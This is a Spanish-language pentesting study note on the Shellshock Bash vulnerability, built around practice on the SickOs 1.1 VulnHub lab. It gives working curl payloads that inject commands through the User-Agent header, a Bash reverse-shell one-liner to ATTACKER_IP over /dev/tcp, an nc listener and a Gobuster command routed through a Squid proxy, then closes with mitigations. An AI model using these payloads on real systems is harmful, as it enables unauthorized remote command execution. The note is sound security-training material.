## 📚 **Índice**

- [[#🎯 **1. Qué es Shellshock y por qué fue tan grave**]]
- [[#⚠️ **2. Sistemas y componentes afectados**]]
- [[#🧠 **3. Root cause: variables de entorno en Bash**]]
- [[#🎯 **4. Vectores de ataque comunes**]]
- [[#🔍 **5. Detección: CGI-BIN expuesto**]]
- [[#🦑 **6. Enumeración vía Squid Proxy + Gobuster**]]
- [[#🛠 **7. Explotación manual con curl (User-Agent)**]]
- [[#🐚 **8. Ganar acceso: Reverse Shell con /bin/bash**]]
- [[#🧪 **9. Escenario realista: SickOs 1.1**]]
- [[#🧱 **10. Mitigación y defensa**]]
- [[#📌 **11. Conclusiones clave**]]

---

## 🎯 **1. Qué es Shellshock y por qué fue tan grave**

**Shellshock** es una vulnerabilidad crítica descubierta en **2014** que afecta al intérprete de comandos **Bash** en sistemas Unix/Linux.

📌 Permitía:

- **Ejecución remota de comandos (RCE)**
    
- Sin autenticación
    
- En servicios expuestos indirectamente
    

🔥 Impacto:

- Web servers
    
- Routers
    
- Dispositivos IoT
    
- Infraestructura crítica
    

Fue masiva porque **Bash estaba en todos lados**.

---

## ⚠️ **2. Sistemas y componentes afectados**

Afecta a:

- Bash < versiones parcheadas (2014)
    
- Sistemas Unix / Linux
    
- Servicios que:
    
    - Pasan input del usuario a Bash
        
    - Usan variables de entorno
        

Especialmente peligroso en:

- **CGI scripts**
    
- Apache + mod_cgi
    
- Entornos legacy
    

---

## 🧠 **3. Root cause: variables de entorno en Bash**

Bash permitía definir funciones en variables de entorno:

```bash
VAR=() { :; }; comando
```

👉 **El bug**:  
Bash ejecutaba **todo lo que viniera después**, sin validar.

Resultado:

- Inyección de comandos
    
- Ejecución automática
    
- RCE
    

---

## 🎯 **4. Vectores de ataque comunes**

Cualquier header HTTP que se convierta en variable de entorno:

- `User-Agent`
    
- `Referer`
    
- `Cookie`
    
- `Host`
    

🔥 El más usado:

> **User-Agent**

Porque:

- Siempre existe
    
- Fácil de manipular
    
- Muy común en CGI
    

---

## 🔍 **5. Detección: CGI-BIN expuesto**

Shellshock **NO existe** si no hay un **CGI script** vulnerable.

Rutas típicas:

```
/cgi-bin/
/cgi-bin/test.cgi
/cgi-bin/status
/cgi-bin/admin.cgi
```

📌 Si ves `cgi-bin` → **alerta máxima**.

---

## 🦑 **6. Enumeración vía Squid Proxy + Gobuster**

Si el acceso directo está filtrado pero hay **Squid Proxy**:

```bash
gobuster dir \
-u http://<IP_INTERNA>/ \
-w /usr/share/wordlists/dirb/common.txt \
--add-slash \
-x cgi,sh,pl \
--proxy http://<SQUID_IP>:3128
```

📌 Flags clave:

- `--add-slash` → necesario para cgi-bin
    
- `-x cgi,sh,pl` → scripts ejecutables
    
- `--proxy` → pivot vía Squid
    

---

## 🛠 **7. Explotación manual con curl (User-Agent)**

Payload base de Shellshock:

```bash
() { :; }; <COMANDO>
```

### Prueba de concepto

```bash
curl -H 'User-Agent: () { :; }; echo VULNERABLE' \
http://<TARGET>/cgi-bin/test.cgi
```

Si responde → **vulnerable confirmado**.

---

## 🐚 **8. Ganar acceso: Reverse Shell con /bin/bash**

### Reverse shell clásico (one-liner)

```bash
bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1
```

### Payload completo con curl

```bash
curl -H 'User-Agent: () { :; }; /bin/bash -c "bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1"' \
http://<TARGET>/cgi-bin/test.cgi
```

### Listener

```bash
nc -lvnp 4444
```

📌 Resultado:

- Shell remota
    
- Usuario del servicio web (`www-data`, etc.)
    

---

## 🧪 **9. Escenario realista: SickOs 1.1**

Máquina vulnerable perfecta para practicar:

🔗 [https://www.vulnhub.com/entry/sickos-11,132/](https://www.vulnhub.com/entry/sickos-11,132/)

Flujo real:

1. 🔍 Enumeras servicios
    
2. 🦑 Detectas Squid Proxy
    
3. 🌐 Accedes a web interna
    
4. 🔎 Encuentras `/cgi-bin/`
    
5. 💥 Explotas Shellshock
    
6. 🐚 Obtienes shell
    
7. ⬆️ Escalas privilegios
    

📌 **Clásico pero fundamental**.

---

## 🧱 **10. Mitigación y defensa**

- ✅ Actualizar Bash
    
- ❌ Deshabilitar CGI si no es necesario
    
- ❌ No pasar headers a Bash
    
- 🔐 Usar WAF
    
- 🛡 Filtrar headers sospechosos
    

---

## 📌 **11. Conclusiones clave**

- ✔️ Shellshock = **RCE directo**
    
- ✔️ Requiere CGI vulnerable
    
- ✔️ User-Agent es vector clásico
    
- ✔️ Squid Proxy puede permitir bypass
    
- ✔️ Vuln histórica, pero **aún aparece**
    

---
